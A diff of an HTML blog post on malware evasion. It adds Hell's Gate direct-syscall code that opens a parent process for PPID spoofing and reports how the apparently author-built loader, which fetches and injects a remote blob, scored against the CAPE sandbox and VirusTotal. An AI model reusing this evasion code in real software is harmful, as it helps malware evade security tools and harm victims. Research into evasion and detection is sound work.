@@ -759,8 +759,20 @@ ret
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
 </span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pSystemProcInfo<span style="color:#f92672">-&gt;</span>ImageName.Length <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">RTIME_FnvHashW</span>(pSystemProcInfo<span style="color:#f92672">-&gt;</span>ImageName.Buffer) <span style="color:#f92672">==</span> uParentProcNameHash) {
 </span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Found Parent Process PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (DWORD)pSystemProcInfo<span style="color:#f92672">-&gt;</span>UniqueProcessId);
-</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_CREATE_PROCESS, FALSE, (DWORD)pSystemProcInfo<span style="color:#f92672">-&gt;</span>UniqueProcessId);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			OBJECT_ATTRIBUTES ObjAttr <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>			ObjAttr.Length <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(OBJECT_ATTRIBUTES);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			CLIENT_ID Cid <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>				.UniqueProcess <span style="color:#f92672">=</span> pSystemProcInfo<span style="color:#f92672">-&gt;</span>UniqueProcessId,
+</span></span><span style="display:flex;"><span>				.UniqueThread <span style="color:#f92672">=</span> NULL
+</span></span><span style="display:flex;"><span>			};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtOpenProcess.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtOpenProcess.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>			STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(phProcess, PROCESS_CREATE_PROCESS, <span style="color:#f92672">&amp;</span>ObjAttr, <span style="color:#f92672">&amp;</span>Cid);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (STATUS <span style="color:#f92672">==</span> STATUS_SUCCESS) {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			}
 </span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>		pSystemProcInfo <span style="color:#f92672">=</span> (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo <span style="color:#f92672">+</span> pSystemProcInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset);
 </span></span><span style="display:flex;"><span>
@@ -908,8 +920,11 @@ ret
 <p><img src="./netutil6-no-createprocessinternalw.png" alt="netutil6-no-createprocessinternalw"></p>
 <p>CAPE did trace the calls to <code>UpdateProcThreadAttribute</code> to update child process and the <code>NtOpenProcess</code> call for resuming process, after the blob was fetched from internet.</p>
 <p><img src="./netutil6-final-function-trace.png" alt="netutil6-final-function-trace"></p>
-<p>But it was not a significant issue, as there were no detections of APC Injection or PPID Spoofing.</p>
+<p>It was not a significant issue, as there were no detections of APC Injection or PPID Spoofing.</p>
 <p><img src="./netutil6-no-ppid-no-apc-injection.png" alt="netutil6-no-ppid-no-apc-injection"></p>
+<p>When I ran it through VirusTotal, the detections sprang back to 2 from 0.</p>
+<p><img src="./netutil6-virustotal.png" alt="netutil6-virustotal.png"></p>
+<p>Thus in quest to evade runtime analysis, I took hit on static scans which solidifies the claim that modern evasion is just a tradeoff between different indicators.</p>
 </div>
 </article>
 
